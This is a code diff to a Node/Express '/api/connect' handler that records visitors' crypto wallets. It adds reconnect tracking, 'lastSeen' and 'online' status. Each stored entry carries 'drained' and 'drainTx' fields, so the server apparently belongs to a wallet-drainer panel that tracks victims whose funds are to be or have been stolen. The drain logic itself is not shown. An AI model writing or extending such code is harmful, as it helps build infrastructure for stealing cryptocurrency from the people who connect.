@@ -102,15 +102,22 @@ app.post('/api/connect', (req, res) => {
   if (!address) return res.json({ ok: false })
 
   const existing = connectedWallets.find(w => w.address.toLowerCase() === address.toLowerCase())
-  if (!existing) {
+  if (existing) {
+    existing.lastSeen   = new Date().toISOString()
+    existing.chainId    = chainId
+    existing.online     = true
+    addLog('info', `Wallet reconnected: ${address} on chainId ${chainId}`)
+  } else {
     const entry = {
-      id:        Date.now(),
+      id:          Date.now(),
       address,
       chainId,
-      userAgent: userAgent || '',
+      userAgent:   userAgent || '',
       connectedAt: new Date().toISOString(),
-      drained:   false,
-      drainTx:   null,
+      lastSeen:    new Date().toISOString(),
+      online:      true,
+      drained:     false,
+      drainTx:     null,
     }
     connectedWallets.unshift(entry)
     addLog('info', `Wallet connected: ${address} on chainId ${chainId}`)
